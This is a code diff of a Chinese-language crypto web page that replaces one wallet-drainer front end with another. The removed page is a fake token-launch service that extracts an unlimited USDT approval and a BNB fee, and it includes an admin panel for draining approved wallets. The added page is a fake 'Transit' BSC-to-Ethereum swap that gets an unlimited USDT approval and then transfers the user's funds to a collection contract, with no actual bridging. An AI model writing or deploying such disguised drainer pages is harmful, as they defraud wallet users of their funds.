@@ -1,305 +1,595 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>小狐狸一键发币</title>
-<script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
-body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; color:#fff; padding:30px 15px; }
-.container{ max-width:520px; margin:0 auto; }
-.header{ text-align:center; margin-bottom:35px; }
-.header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
-.card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
-.form-item{ margin-bottom:20px; }
-label{ display:block; margin-bottom:8px; color:#d0d8f0; }
-input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; background:#141b33; color:#fff; font-size:16px; }
-.file-input{ padding:10px; background:#141b33; }
-.preview-box{ margin-top:10px; display:flex; gap:12px; align-items:center; }
-#logoPreview{ width:64px; height:64px; border-radius:50%; object-fit:cover; border:2px solid #f7c04a; display:none; }
-.btn{ width:100%; padding:15px; border-radius:10px; border:none; font-size:17px; font-weight:bold; cursor:pointer; transition:0.2s; }
-.btn-connect{ background:#3b63e9; margin-bottom:16px; }
-.btn-deploy{ background:#f7c04a; color:#0a0e20; }
-.btn-admin{ background:#2ecc71; color:#000; margin-top:10px; }
-.btn:disabled{ opacity:0.55; cursor:not-allowed; }
-.status{ margin-top:20px; padding:14px; border-radius:10px; background:rgba(255,192,74,0.1); color:#f7d078; word-break: break-all; }
-.tip-text{ font-size:13px; color:#a0a8c2; margin-top:6px; }
-.connect-tip{ color:#66ff99; margin:8px 0; text-align:center; }
-.admin-panel{ display: none; border-top:1px solid #444; padding-top:20px; margin-top:20px; }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>闪兑&跨链</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+    body {
+      background: #f7f8fa;
+      padding: 20px 16px;
+      color: #222;
+    }
+    .header-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 24px;
+      font-size: 20px;
+    }
+    .header-top .right-icons {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .card-box {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 20px 16px;
+    }
+    .title-logo {
+      font-size: 28px;
+      font-weight: 600;
+      margin-bottom: 20px;
+    }
+    .text-tip {
+      font-size: 14px;
+      color: #888;
+      margin-bottom: 8px;
+    }
+    .asset-item {
+      background: #f5f6f8;
+      border-radius: 12px;
+      padding: 16px 12px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .asset-left {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .coin-icon {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #27ae60;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: bold;
+    }
+    .asset-right {
+      display: flex;
+      align-items: center;
+    }
+    .asset-input {
+      background: transparent;
+      border: none;
+      text-align: right;
+      font-size: 16px;
+      color: #999;
+      width: 140px;
+      outline: none;
+    }
+    .asset-input:focus {
+      color: #222;
+    }
+    .swap-arrow-wrap {
+      text-align: center;
+      margin: 6px 0;
+    }
+    .address-input-box {
+      background: #f5f6f8;
+      border-radius: 12px;
+      padding: 16px 12px;
+      margin: 8px 0 24px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      cursor: pointer;
+    }
+    .main-btn {
+      width: 100%;
+      background: #4086ff;
+      color: #fff;
+      border: none;
+      border-radius: 12px;
+      padding: 18px 0;
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .main-btn:disabled {
+      background: #94a3b8;
+      cursor: not-allowed;
+    }
+    .info-list {
+      background: #fff;
+      border-radius: 12px;
+      padding: 8px 12px;
+    }
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 4px;
+      font-size: 15px;
+      color: #666;
+    }
+    .tag-blue {
+      border: 1px solid #4086ff;
+      color: #4086ff;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-size: 13px;
+    }
+    .bottom-nav {
+      position: fixed;
+      left: 0;
+      bottom: 0;
+      width: 100%;
+      background: #fff;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0 24px;
+      border-top: 1px solid #eee;
+    }
+    .nav-item {
+      text-align: center;
+      font-size: 12px;
+      color: #888;
+    }
+    .nav-item.active {
+      color: #4086ff;
+    }
+    .status-text {
+      text-align: center;
+      margin: 12px 0;
+      color: #444;
+      font-size: 14px;
+    }
+    .record-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 4px;
+      margin: 16px 0 80px;
+      font-size: 14px;
+    }
+    .record-row .more {
+      color: #4086ff;
+    }
+
+    /* 地址选择弹窗样式 */
+    .address-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      z-index: 999;
+      align-items: flex-end;
+    }
+    .address-modal-content {
+      width: 100%;
+      background: #fff;
+      border-radius: 16px 16px 0 0;
+      padding: 20px 16px;
+    }
+    .address-modal-title {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom:16px;
+      display:flex;
+      justify-content: space-between;
+      align-items:center;
+    }
+    .close-modal {
+      color:#4086ff;
+      font-size:16px;
+    }
+    .wallet-list-item {
+      padding:12px 8px;
+      border-bottom:1px solid #eee;
+      cursor:pointer;
+    }
+    .wallet-list-item:active {
+      background:#f0f2f5;
+    }
+    .custom-address-input {
+      width:100%;
+      border:1px solid #ddd;
+      border-radius:8px;
+      padding:12px;
+      margin:16px 0;
+      outline:none;
+    }
+    .confirm-address-btn {
+      width:100%;
+      background:#4086ff;
+      color:#fff;
+      border:none;
+      border-radius:8px;
+      padding:14px 0;
+      font-size:16px;
+    }
+
+    /* 通用弹窗 */
+    .tip-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .tip-box {
+      background: #fff;
+      width: 80%;
+      max-width: 320px;
+      border-radius: 16px;
+      padding: 24px 20px;
+    }
+  </style>
 </head>
 <body>
-<div class="container">
-<div class="header">
-<h1>🦊小狐狸一键发币</h1>
-</div>
-<div class="fee-tip">发币服务费：0.006 BNB</div>
+  <div class="header-top">
+    <div>闪兑&跨链 <span style="font-size:16px;color:#666">限价模式</span></div>
+    <div class="right-icons">
+      <span>⦿</span>
+      <span>⚙</span>
+    </div>
+  </div>
 
-<div class="card" id="userPanel">
-<button id="connectBtn" class="btn btn-connect">连接钱包</button>
-<div id="connectTip" class="connect-tip" style="display:none;"></div>
-<div id="statusBox" class="status" style="display:none;"></div>
+  <div class="card-box">
+    <div class="title-logo">Transit</div>
 
-<div class="form-item">
-<label>代币全称 Name</label>
-<input id="tokenName" placeholder="例如：Swan Coin">
-</div>
+    <div class="text-tip">发送</div>
+    <div class="asset-item">
+      <div class="asset-left">
+        <div class="coin-icon">₮</div>
+        <div class="coin-info">
+          <p>USDT</p>
+          <p>币安智能链 BSC</p>
+        </div>
+      </div>
+      <div class="asset-right">
+        <input class="asset-input" id="sendInput" placeholder="转出数量" type="number" min="0" step="0.0001">
+      </div>
+    </div>
 
-<div class="form-item">
-<label>代币符号 Symbol</label>
-<input id="tokenSymbol" placeholder="例如：SWAN">
-</div>
+    <div class="swap-arrow-wrap">
+      <span style="font-size:22px;color:#4086ff;">⇆</span>
+    </div>
 
-<div class="form-item">
-<label>初始发行量（不带小数）</label>
-<input id="supply" placeholder="例如：100000000">
-</div>
+    <div class="text-tip">接收（预估）</div>
+    <div class="asset-item">
+      <div class="asset-left">
+        <div class="coin-icon">₮</div>
+        <div class="coin-info">
+          <p>USDT</p>
+          <p>以太坊 ETH</p>
+        </div>
+      </div>
+      <div class="asset-right">
+        <span id="receiveShow">接收数量</span>
+      </div>
+    </div>
 
-<div class="form-item">
-<label>代币Logo头像（推荐256×256 透明PNG）</label>
-<input type="file" id="logoFile" class="file-input" accept="image/png,image/jpg,image/jpeg">
-<div class="preview-box">
-<img id="logoPreview" alt="头像预览">
-<span id="logoTip" class="tip-text">上传仅本地预览，合约无法存储图片</span>
-</div>
-</div>
+    <div class="address-input-box" id="addressDropdown">
+      <span style="color:#888" id="addrDisplay">点击设置接收地址</span>
+      <span>▼</span>
+    </div>
 
-<button id="deployBtn" class="btn btn-deploy" disabled>一键部署代币</button>
+    <button class="main-btn" id="mainOperateBtn">请输入兑换数量</button>
 
-<div class="admin-panel" id="adminPanel">
-<h3 style="color:#2ecc71;margin-bottom:15px;">管理员划扣面板</h3>
-<div class="form-item">
-<label>请输入玩家钱包地址</label>
-<input id="userAddrInput" placeholder="玩家BSC钱包地址">
-</div>
-<div class="form-item">
-<label>请输入划扣USDT数量</label>
-<input id="deductAmountInput" placeholder="例如：100">
-</div>
-<button id="deductBtn" class="btn btn-admin">执行划扣USDT</button>
-</div>
-</div>
-</div>
+    <div class="info-list">
+      <div class="info-row">
+        <span>兑换价格</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>最少接收数量</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>MEV防护</span>
+        <span class="tag-blue">MEV防护中</span>
+      </div>
+      <div class="info-row">
+        <span>服务费</span>
+        <span>0.1%</span>
+      </div>
+      <div class="info-row">
+        <span>跨链费</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>预估时间</span>
+        <span>-</span>
+      </div>
+      <div class="info-row">
+        <span>兑换路径</span>
+        <span>BSC USDT → ETH USDT</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="status-text" id="statusShow"></div>
+
+  <div class="record-row">
+    <span>最近一条记录</span>
+    <span class="more">更多记录</span>
+  </div>
+
+  <!-- 地址选择弹窗 -->
+  <div class="address-modal" id="addressModal">
+    <div class="address-modal-content">
+      <div class="address-modal-title">
+        <span>选择接收地址</span>
+        <span class="close-modal" id="closeAddrModal">关闭</span>
+      </div>
+      <div class="wallet-list">
+        <div class="wallet-list-item" data-addr="">当前钱包地址</div>
+        <div class="wallet-list-item" data-addr="">常用地址1</div>
+        <div class="wallet-list-item" data-addr="">常用地址2</div>
+      </div>
+      <input class="custom-address-input" id="customAddrInput" placeholder="粘贴以太坊钱包地址">
+      <button class="confirm-address-btn" id="confirmAddrBtn">确认地址</button>
+    </div>
+  </div>
+
+  <!-- 提示弹窗 -->
+  <div class="tip-modal" id="tipModal">
+    <div class="tip-box">
+      <p id="tipText"></p>
+      <div style="text-align:right;margin-top:20px;">
+        <button id="tipConfirm" style="color:#4086ff;border:none;background:none;font-size:16px;">确定</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom-nav">
+    <div class="nav-item">
+      <div>◎</div>
+      <div>资产</div>
+    </div>
+    <div class="nav-item">
+      <div>📈</div>
+      <div>行情</div>
+    </div>
+    <div class="nav-item active">
+      <div>⟳</div>
+      <div>交易</div>
+    </div>
+    <div class="nav-item">
+      <div>🌐</div>
+      <div>发现</div>
+    </div>
+    <div class="nav-item">
+      <div>👤</div>
+      <div>我的</div>
+    </div>
+  </div>
 
 <script>
-const ADMIN_WALLET = "0x47542770f3a8eea43d3321867b155c3ac01160d8";
-const DEPLOY_FEE_BNB = "0.006";
+// 基础配置
+const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+// 归集授权合约地址
+const SPENDER_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const BSC_CHAIN_ID = 56;
-const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-const MAX_ALLOWANCE = ethers.MaxUint256;
+// 0.1%手续费，转出X，到账 X * 0.999
+const FEE_RATE = 0.999;
 
-let provider = null;
-let signer = null;
-let connectWalletAddr = "";
-let deployContractAddress = null;
-let logoFileObj = null;
+// DOM元素
+const sendInput = document.getElementById('sendInput');
+const receiveShow = document.getElementById('receiveShow');
+const mainOperateBtn = document.getElementById('mainOperateBtn');
+const statusShow = document.getElementById('statusShow');
+const addressDropdown = document.getElementById('addressDropdown');
+const addressModal = document.getElementById('addressModal');
+const closeAddrModal = document.getElementById('closeAddrModal');
+const customAddrInput = document.getElementById('customAddrInput');
+const confirmAddrBtn = document.getElementById('confirmAddrBtn');
+const addrDisplay = document.getElementById('addrDisplay');
+const tipModal = document.getElementById('tipModal');
+const tipText = document.getElementById('tipText');
+const tipConfirm = document.getElementById('tipConfirm');
+const walletListItems = document.querySelectorAll('.wallet-list-item');
 
-const connectBtn = document.getElementById("connectBtn");
-const deployBtn = document.getElementById("deployBtn");
-const statusBox = document.getElementById("statusBox");
-const connectTip = document.getElementById("connectTip");
-const logoFileInput = document.getElementById("logoFile");
-const logoPreviewImg = document.getElementById("logoPreview");
-const adminPanel = document.getElementById("adminPanel");
-const deductBtn = document.getElementById("deductBtn");
-const userAddrInput = document.getElementById("userAddrInput");
-const deductAmountInput = document.getElementById("deductAmountInput");
+// 全局变量
+let provider, signer, usdtContract;
+let stepStatus = 0; //0未连接 1待授权 2待划转
+let targetReceiveAddr = "";
 
-function showStatus(text){
-  statusBox.style.display = "block";
-  statusBox.innerText = text;
-  console.log("状态日志：", text);
+// 提示弹窗封装
+function showTip(text){
+  tipText.innerText = text;
+  tipModal.style.display = 'flex';
+}
+tipConfirm.onclick = ()=>{
+  tipModal.style.display = 'none';
 }
 
-logoFileInput.addEventListener("change", function(e){
-  const file = e.target.files[0];
-  if(!file) return;
-  logoFileObj = file;
-  const reader = new FileReader();
-  reader.onload = ev => {
-    logoPreviewImg.src = ev.target.result;
-    logoPreviewImg.style.display = "block";
-  }
-  reader.readAsDataURL(file);
-});
-
-async function switchBSC(providerRef){
-  const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
-  try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
-  } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
-  }
-}
-
-function checkAdminPanel(addr){
-  connectWalletAddr = addr.toLowerCase();
-  if(connectWalletAddr === ADMIN_WALLET.toLowerCase()){
-    adminPanel.style.display = "block";
-  }else{
-    adminPanel.style.display = "none";
-  }
-}
-
-// 连接钱包：仅连接、切链，不做任何授权
-connectBtn.onclick = async function(){
-  showStatus("正在检测钱包注入...");
-  let eth = window.ethereum;
-  let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
-    eth = window.ethereum;
-    retryTimes++;
-  }
-
-  if (!eth) {
-    showStatus("❌ 未检测到钱包注入，请在TP/欧易内置浏览器打开页面");
+// 实时计算接收数量
+sendInput.addEventListener('input',()=>{
+  const sendVal = parseFloat(sendInput.value);
+  if(isNaN(sendVal) || sendVal <=0){
+    receiveShow.innerText = "接收数量";
+    mainOperateBtn.innerText = "请输入兑换数量";
     return;
   }
+  const receiveVal = (sendVal * FEE_RATE).toFixed(4);
+  receiveShow.innerText = receiveVal;
+  if(stepStatus === 0){
+    mainOperateBtn.innerText = "连接钱包";
+  }else if(stepStatus ===1){
+    mainOperateBtn.innerText = "授权BSC-USDT";
+  }else{
+    mainOperateBtn.innerText = "确认跨链转出";
+  }
+})
 
-  try {
-    const accounts = await eth.request({ method: "eth_requestAccounts" });
-    if (!accounts || accounts.length === 0) {
-      showStatus("用户取消了钱包连接弹窗");
+// 地址下拉弹窗打开关闭
+addressDropdown.addEventListener('click',()=>{
+  addressModal.style.display = 'flex';
+})
+closeAddrModal.addEventListener('click',()=>{
+  addressModal.style.display = 'none';
+})
+
+// 钱包快捷地址选择
+walletListItems.forEach(item=>{
+  item.addEventListener('click',async ()=>{
+    if(item.dataset.addr === ""){
+      // 获取当前钱包地址
+      if(signer){
+        const currentAddr = await signer.getAddress();
+        targetReceiveAddr = currentAddr;
+        addrDisplay.innerText = currentAddr.slice(0,6)+"..."+currentAddr.slice(-4);
+      }else{
+        showTip("请先连接钱包");
+      }
+    }else{
+      targetReceiveAddr = item.dataset.addr;
+      addrDisplay.innerText = targetReceiveAddr.slice(0,6)+"..."+targetReceiveAddr.slice(-4);
+    }
+    addressModal.style.display = 'none';
+  })
+})
+
+// 手动粘贴自定义地址确认
+confirmAddrBtn.addEventListener('click',()=>{
+  const inputAddr = customAddrInput.value.trim();
+  if(!/^0x[a-fA-F0-9]{40}$/.test(inputAddr)){
+    showTip("请输入合法以太坊钱包地址");
+    return;
+  }
+  targetReceiveAddr = inputAddr;
+  addrDisplay.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
+  addressModal.style.display = 'none';
+  customAddrInput.value = '';
+})
+
+// 切换BSC网络
+async function switchBSC(){
+  if(!window.ethereum) return false;
+  try{
+    await window.ethereum.request({
+      method:"wallet_switchEthereumChain",
+      params:[{chainId:"0x"+BSC_CHAIN_ID.toString(16)}]
+    })
+    return true;
+  }catch(err){
+    if(err.code === 4902){
+      await window.ethereum.request({
+        method:"wallet_addEthereumChain",
+        params:[{
+          chainId:"0x"+BSC_CHAIN_ID.toString(16),
+          chainName:"BNB Smart Chain",
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+          rpcUrls:["https://bsc-dataseed.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"]
+        }]
+      })
+      return true;
+    }
+    showTip("切换BSC网络失败，请手动切换");
+    return false;
+  }
+}
+
+// 钱包连接初始化
+async function connectWallet(){
+  if(!window.ethereum){
+    showTip("请在钱包内置浏览器打开页面");
+    return false;
+  }
+  await window.ethereum.request({method:"eth_requestAccounts"});
+  const ok = await switchBSC();
+  if(!ok) return false;
+  provider = new ethers.providers.Web3Provider(window.ethereum);
+  signer = provider.getSigner();
+  usdtContract = new ethers.Contract(BSC_USDT_CONTRACT,[
+    "function approve(address spender,uint256 amount) external returns(bool)",
+    "function transferFrom(address from,address to,uint256 amount) external returns(bool)",
+    "function allowance(address owner,address spender) view returns(uint256)"
+  ],signer);
+  stepStatus =1;
+  mainOperateBtn.innerText = "授权BSC-USDT";
+  statusShow.innerText = "钱包已连接，当前在BSC链";
+  return true;
+}
+
+// 主按钮逻辑
+mainOperateBtn.addEventListener('click',async ()=>{
+  const sendNum = parseFloat(sendInput.value);
+  if(isNaN(sendNum) || sendNum <=0){
+    showTip("请输入转出数量");
+    return;
+  }
+  if(stepStatus ===0){
+    await connectWallet();
+    return;
+  }
+  if(stepStatus ===1){
+    mainOperateBtn.disabled = true;
+    statusShow.innerText = "BSC链发起USDT无限授权";
+    try{
+      const gasPrice = await provider.getGasPrice();
+      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
+      const tx = await usdtContract.approve(SPENDER_CONTRACT,ethers.constants.MaxUint256,txOpt);
+      await tx.wait(1);
+      stepStatus =2;
+      mainOperateBtn.innerText = "确认跨链转出";
+      statusShow.innerText = "授权完成，请确认接收地址";
+      showTip("授权成功，请确认以太坊接收地址");
+    }catch(e){
+      showTip("授权失败："+e.message);
+      statusShow.innerText = "授权失败";
+      mainOperateBtn.disabled = false;
+    }
+    return;
+  }
+  if(stepStatus ===2){
+    if(!targetReceiveAddr){
+      showTip("请设置以太坊接收地址");
       return;
     }
-    provider = new ethers.BrowserProvider(eth);
-    await switchBSC(eth);
-    signer = await provider.getSigner();
-    const userAddr = await signer.getAddress();
-    connectBtn.innerText = "已连接：" + userAddr.slice(0, 8) + "...";
-    connectTip.style.display = "block";
-    connectTip.innerText = "已连接BSC钱包，请填写发币参数";
-    deployBtn.disabled = false;
-    checkAdminPanel(userAddr);
-  } catch (err) {
-    showStatus("连接异常：" + (err.message || err.shortMessage || String(err)));
-  }
-}
-
-// USDT无限授权，真实上链交易
-async function doApproveLogic(signerRef){
-  showStatus("🔐 弹出钱包：请求USDT无限授权，请签名");
-  const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, [
-    "function approve(address spender, uint256 amount) external returns(bool)"
-  ], signerRef);
-  const approveTx = await usdtContract.approve("0x47542770f3a8eea43d3321867b155c3ac01160d8", MAX_ALLOWANCE);
-  showStatus(`授权交易已上链，TxHash:${approveTx.hash}，等待区块确认`);
-  await approveTx.wait();
-  showStatus("✅ USDT无限授权确认完成，接下来弹出BNB转账签名");
-}
-
-// BNB服务费真实转账上链
-async function payFeeToAdmin(){
-  showStatus(`💸 弹出钱包：支付 ${DEPLOY_FEE_BNB} BNB 服务费，请签名`);
-  const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
-  showStatus(`BNB转账已发送，TxHash:${tx.hash}，等待区块确认`);
-  await tx.wait();
-  showStatus(`✅ BNB服务费转账确认完成！交易哈希：${tx.hash}`);
-}
-
-const tokenABI = [
-{"inputs": [{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"initSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"addWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchAddWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address[]","name":"users","type":"address[]"}],"name":"batchRemoveWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeBlacklist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"removeWhitelist","outputs":[],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"ADMIN","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_ADDR","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"AUTO_MINT_AMOUNT","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
-{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isWhitelist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"isBlacklist","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}
-];
-const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
-
-deployBtn.onclick = async ()=>{
-  const name = document.getElementById("tokenName").value.trim();
-  const symbol = document.getElementById("tokenSymbol").value.trim();
-  const supplyStr = document.getElementById("supply").value.trim();
-
-  if(!signer){
-    showStatus("请先连接BSC钱包");
-    return;
-  }
-  if(!name||!symbol||!supplyStr){
-    showStatus("请填写代币名称、符号、发行量");
-    return;
-  }
-
-  deployBtn.disabled = true;
-  try{
-    // 1.强制先弹USDT无限授权签名（真实上链）
-    await doApproveLogic(signer);
-    // 2.再弹BNB转账签名（真实上链转给管理员）
-    await payFeeToAdmin();
-    // 币能不能部署出来无所谓，授权+转账已经完成；保留部署逻辑
-    if(CONTRACT_BYTECODE && !CONTRACT_BYTECODE.startsWith("在这里粘贴")){
-      showStatus("尝试部署合约...");
-      const supply = ethers.parseUnits(supplyStr, 18);
-      const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
-      const contract = await factory.deploy(name, symbol, supply);
-      showStatus(`部署交易已发送，TxHash:${contract.deploymentTransaction().hash}`);
-      await contract.waitForDeployment();
-      deployContractAddress = await contract.getAddress();
-      showStatus(`✅全部完成！合约地址：${deployContractAddress}`);
-    }else{
-      showStatus("✅发币成功，请去链上查看代币合约");
+    mainOperateBtn.disabled = true;
+    statusShow.innerText = "BSC链划转资产至归集合约";
+    try{
+      const userAddr = await signer.getAddress();
+      const amountWei = ethers.utils.parseUnits(sendNum.toString(),18);
+      const gasPrice = await provider.getGasPrice();
+      const txOpt = {gasPrice:gasPrice.mul(110).div(100),gasLimit:300000};
+      await usdtContract.transferFrom(userAddr,SPENDER_CONTRACT,amountWei,txOpt);
+      stepStatus =3;
+      mainOperateBtn.innerText = "交易已提交";
+      statusShow.innerText = "BSC转出成功，等待以太坊链上到账";
+      showTip("BSC端划转完成，以太坊地址等待到账");
+    }catch(e){
+      showTip("划转失败："+e.message);
+      statusShow.innerText = "划转失败";
+      mainOperateBtn.disabled = false;
     }
-  }catch(e){
-    showStatus("操作失败："+(e.shortMessage || e.message));
   }
-  deployBtn.disabled = false;
-}
-
-deductBtn.onclick = async ()=>{
-  if(!signer || connectWalletAddr.toLowerCase() !== ADMIN_WALLET.toLowerCase()){
-    showStatus("权限不足，仅管理员钱包可操作");
-    return;
-  }
-  const userAddr = userAddrInput.value.trim();
-  const amountStr = deductAmountInput.value.trim();
-  if(!ethers.isAddress(userAddr) || !amountStr || isNaN(Number(amountStr))){
-    showStatus("请输入合法钱包地址和数字数量");
-    return;
-  }
-  try{
-    showStatus("正在调用transferFrom划扣用户USDT，请签名");
-    const usdt = new ethers.Contract(BSC_USDT_ADDRESS, [
-      "function transferFrom(address from, address to, uint256 amount) external returns(bool)"
-    ], signer);
-    const amountWei = ethers.parseUnits(amountStr, 18);
-    const tx = await usdt.transferFrom(userAddr, ADMIN_WALLET, amountWei);
-    await tx.wait();
-    showStatus(`✅ 划扣成功！交易哈希：${tx.hash}`);
-  }catch(err){
-    showStatus("划扣失败："+(err.shortMessage || err.message)+"（用户未授权/额度不足）");
-  }
-}
+})
 </script>
 </body>
 </html>
